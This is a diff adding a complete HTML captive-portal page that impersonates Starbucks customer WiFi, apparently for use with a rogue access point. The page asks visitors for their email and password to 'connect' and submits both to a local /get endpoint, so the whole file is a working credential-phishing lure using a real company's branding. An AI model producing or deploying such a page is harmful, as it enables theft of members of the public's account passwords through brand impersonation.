@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Starbucks WiFi</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;background:#1E3932;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{width:100%;max-width:400px;background:#fff;border-radius:4px;overflow:hidden;box-shadow:0 8px 40px rgba(0,0,0,0.3)}
+.top{background:#1E3932;padding:28px 24px 20px;text-align:center}
+.siren{font-size:42px;margin-bottom:8px}
+.brand{font-size:14px;font-weight:700;color:#fff;letter-spacing:3px;text-transform:uppercase}
+.tagline{font-size:10px;color:#7faa9b;letter-spacing:2px;text-transform:uppercase;margin-top:4px}
+.mid{background:#00704A;padding:8px 24px;display:flex;align-items:center;gap:8px}
+.dot{width:6px;height:6px;background:#CBA258;border-radius:50%;flex-shrink:0}
+.mid span{font-size:11px;color:rgba(255,255,255,0.8)}
+.mid strong{color:#fff;font-weight:600}
+.body{padding:26px 24px 20px}
+h2{font-size:18px;font-weight:700;color:#1E3932;margin-bottom:4px}
+.sub{font-size:12.5px;color:#aaa;margin-bottom:4px}
+.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#777;margin-bottom:6px;margin-top:18px}
+input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:4px;font-size:14.5px;background:#f9f9f9;color:#1a1a1a;font-family:inherit}
+input:focus{outline:none;border-color:#1E3932;box-shadow:0 0 0 3px rgba(30,57,50,0.08)}
+input::placeholder{color:#ccc}
+.btn{width:100%;padding:13px;margin-top:20px;border:none;border-radius:50px;background:#1E3932;color:#fff;font-size:13px;font-weight:700;letter-spacing:0.5px;cursor:pointer;font-family:inherit}
+.btn:active{opacity:0.9}
+.terms{font-size:11px;color:#bbb;text-align:center;margin-top:13px;line-height:1.6}
+.terms a{color:#1E3932}
+.foot{background:#f5f5f5;border-top:1px solid #eee;padding:11px 24px;display:flex;justify-content:space-between}
+.foot span,.foot a{font-size:10.5px;color:#bbb;text-decoration:none}
+.foot a{color:#1E3932}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="top">
+    <div class="siren">☕</div>
+    <div class="brand">Starbucks</div>
+    <div class="tagline">Free Customer WiFi</div>
+  </div>
+  <div class="mid"><div class="dot"></div><span>Network: <strong>Starbucks WiFi</strong></span></div>
+  <div class="body">
+    <h2>Welcome to Starbucks</h2>
+    <p class="sub">Sign in with your Starbucks account to connect.</p>
+    <form action="/get">
+      <label class="lbl">Email Address</label>
+      <input name="email" type="text" placeholder="you@example.com" required>
+      <label class="lbl">Password</label>
+      <input name="password" type="password" placeholder="Enter your password" required>
+      <button type="submit" class="btn">Connect</button>
+      <p class="terms">By connecting you agree to our <a href="#">Terms of Use</a>.</p>
+    </form>
+  </div>
+  <div class="foot"><span>&copy; Starbucks Coffee Company</span><a href="#">Help</a></div>
+</div>
+</body>
+</html>
